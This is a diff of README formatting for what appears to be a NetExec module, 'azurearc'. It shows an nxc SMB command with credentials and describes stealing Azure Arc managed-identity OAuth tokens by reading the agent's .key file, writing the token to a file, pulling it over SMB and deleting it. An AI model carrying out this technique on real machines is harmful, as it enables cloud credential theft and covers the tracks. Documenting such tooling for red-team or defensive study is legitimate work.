@@ -32,16 +32,16 @@ nxc smb 192.168.1.100 -u USER -p 'PASS' -M azurearc
 }
 ```
 
-#### 🔍 How It Works (Behavior)
+## 🔍 How It Works (Behavior)
 ### Presence check via SMB listing:
 C:\Program Files\AzureConnectedMachineAgent\*  
 C:\Program Files (x86)\AzureConnectedMachineAgent\*
 
 ### Token retrieval on target (PowerShell):
-1.GET http://localhost:40342/metadata/identity/oauth2/token?resource=...&api-version=...\
-→ expect 401 with WWW-Authenticate: Basic realm="<path to .key>"\
-Read the .key contents (requires local admin).
-2.Second GET with Authorization: Basic <key> to obtain token JSON.\
+1.GET http://localhost:40342/metadata/identity/oauth2/token?resource=...&api-version=...  
+→ expect 401 with WWW-Authenticate: Basic realm="<path to .key>"  
+Read the .key contents (requires local admin).  
+2.Second GET with Authorization: Basic <key> to obtain token JSON.  
 Write JSON to OUTFILE, fetch via SMB, and delete the file.
 
 
